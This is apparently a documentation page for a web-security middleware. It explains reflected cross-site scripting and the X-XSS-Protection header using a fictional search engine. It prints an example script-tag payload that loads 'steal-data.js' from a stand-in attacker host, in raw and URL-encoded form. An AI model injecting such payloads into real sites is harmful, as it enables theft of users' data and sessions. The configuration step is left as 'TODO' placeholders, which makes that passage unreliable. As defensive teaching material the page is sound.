---
layout: page
title: XSS Filter
permalink: /xss-filter/
---
In short, the `xssFilter` middleware sets the `X-XSS-Protection` header to prevent reflected XSS attacks.

The attack
----------

Cross-site scripting, abbreviated to "XSS", is a way attackers can take over webpages. The goal of an XSS attack is to gain control of JavaScript in the victim's browser. Once a hacker has done that, there's a lot of nasty stuff they can do: log your actions, impersonate you, steal your authentication cookies, and much more.

XSS is a multifaceted beast and we won't learn everything about it here. The main takeaway: if someone can run JavaScript on your page, they can attack your users and do a lot of bad things. We want to prevent it!

One kind of XSS is called "Reflected XSS". Typically, it works by setting a query string which is put directly into the HTML. Putting JavaScript in the query string can let an attacker execute their JavaScript just by giving someone a malicious query string.

For example, let's say you run a search engine called Goober. Every time you do a search, it displays your search terms right above your results. For example, let's say we've searched for "javascript jokes".

When you do a search, your search terms also appear in your query string. The full URL might look something like this:

```
https://goober.example.com/search?query=javascript+jokes
```

The search results might look like the screenshot below. Notice how the text appears right on the page:

![Screenshot of normal Goober search](/xss-filter/xss-filter-ok.png)

What if we could search for something like `<script src="http://evil.example.com/steal-data.js"></script>`? That URL would look like this:

```
https://goober.example.com/search?query=<script%20src="http://evil.example.com/steal-data.js"></script>
```

And here's how it would appear on your page:

![Screenshot of malicious Goober search](/xss-filter/xss-filter-malicious.png)

Suddenly, a malicious JavaScript file was executed just because you visited a URL! That's not good.

Read more:

- [Guide to understanding XSS](http://www.securesolutions.no/xss-explained/)
- [Cross-site Scripting (XSS)](https://www.owasp.org/index.php/XSS)
- [What is Reflected XSS?](http://security.stackexchange.com/q/65142)
- [XSS (Cross Site Scripting) Prevention Cheat Sheet](https://www.owasp.org/index.php/XSS_(Cross_Site_Scripting)_Prevention_Cheat_Sheet)

The header
----------

To be very clear: *this header does not protect you from XSS attacks much*. It protects against a very particular kind of XSS, and other mitigation measures are far better. This header provides a quick win and basic protection, but this header does not save you from XSS attacks.

It's relatively easy for browsers to detect simple reflected XSS. In the example above, browsers could choose not to execute the JavaScript inside a `<script>` tag if it matches what's in the query string. Some browsers do this detection by default, but some don't. To make these browsers check for this simple case, you can set the TODO header to TODO.

This tells browsers to detect and block reflected XSS.

This header causes some *even worse* security vulnerabilities in older versions of Internet Explorer, so it's wise to disable it there.
